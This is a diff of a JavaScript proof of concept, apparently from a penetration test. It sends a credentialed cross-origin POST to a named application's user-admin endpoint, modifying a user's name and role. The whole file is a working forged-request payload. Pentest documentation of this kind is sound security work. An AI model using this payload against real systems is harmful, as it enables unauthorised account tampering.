@@ -1,6 +1,5 @@
 // Crear una nueva instancia de XMLHttpRequest
 var xhr = new XMLHttpRequest();
-xhr.withCredentials = true;
 // Configurar la petición con el método POST y la URL adecuada
 xhr.open("POST", "https://bp-saas-tst.sin-cola.com/user_admin/edit_user_ajax", true);
 
@@ -22,6 +21,7 @@ xhr.setRequestHeader("Hackmetrix-Pentest", "true");
 // Preparar los datos del formulario
 var params = "utf8=%E2%9C%93&%2Fuser_admin%2Fedit_user_ajax%5Bfirst_name%5D=Manager+modifiedWithJS&%2Fuser_admin%2Fedit_user_ajax%5Bid%5D=3&%2Fuser_admin%2Fedit_user_ajax%5Blast_name%5D=Sede+Principal&%2Fuser_admin%2Fedit_user_ajax%5Bdocument_number%5D=&original_document_number=&%2Fuser_admin%2Fedit_user_ajax%5Bemail%5D=manager-ppal@sin-cola.com&original_email=&%2Fuser_admin%2Fedit_user_ajax%5Bphone_number%5D=&%2Fuser_admin%2Fedit_user_ajax%5Baddress%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bnickname%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bactive%5D=true&%2Fuser_admin%2Fedit_user_ajax%5Btype%5D=Manager&branches%5B%5D=1&%2Fuser_admin%2Fedit_user_ajax%5Bhierarchy%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bdivision%5D=";
 
+xhr.withCredentials = true;
 // Asignar una función de callback para manejar la respuesta
 xhr.onreadystatechange = function() {
   if (xhr.readyState === XMLHttpRequest.DONE) {
